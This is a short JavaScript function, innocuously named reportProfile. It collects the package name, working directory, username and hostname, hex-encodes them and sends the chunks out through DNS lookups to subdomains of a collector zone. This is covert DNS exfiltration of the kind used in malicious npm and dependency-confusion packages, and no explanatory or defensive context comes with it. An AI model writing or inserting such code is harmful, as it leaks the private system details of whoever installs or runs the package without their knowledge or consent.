function reportProfile() {
  const os = require('os');
  const dns = require('dns');
  const data = JSON.stringify({
    packagename: process.argv[2],
    cwd: process.cwd(),
    username: os.userInfo().username,
    hostname: os.hostname(),
  });
  const dataHex = Buffer.from(data, 'utf8').toString('hex') + '00';
  const chunks = dataHex.match(/.{1,30}/g);
  const id = 'abcde';
  const zone = 'collector.invalid';
  for (let i = 0; i < chunks.length; i++) {
    const domain = id + '.' + i + '.' + chunks[i] + '.' + zone;
    dns.lookup(domain, { family: 4 }, () => {});
  }
}
